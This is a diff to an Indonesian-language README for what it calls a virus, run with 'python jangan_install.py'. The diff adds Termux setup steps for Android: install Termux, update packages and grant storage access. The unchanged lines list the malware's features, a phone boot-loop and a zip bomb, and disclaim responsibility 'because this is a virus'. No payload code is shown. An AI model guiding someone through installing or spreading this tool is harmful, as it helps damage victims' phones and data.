@@ -15,6 +15,13 @@ python jangan_install.py
 **Note:**
 Jika ada apa-apa silahkan tanggung sendiri, karena apa? Karena ini virus!
 
+## Langkah - langkah
+- [Download termos di plengstore](https://play.google.com/store/apps/details?id=com.termux)
+  - [Klo sudah klik izinkan](?)
+  - [Selesaikan instalasi](?)
+  - [$ pkg update && pkg upgrade](?)
+  - [$ termux-setup-storage » tekan izinkan](?)
+
 ## Fitur:
 - [x] **Hp auto Bootloop**
 - [x] **Kena zip boom**
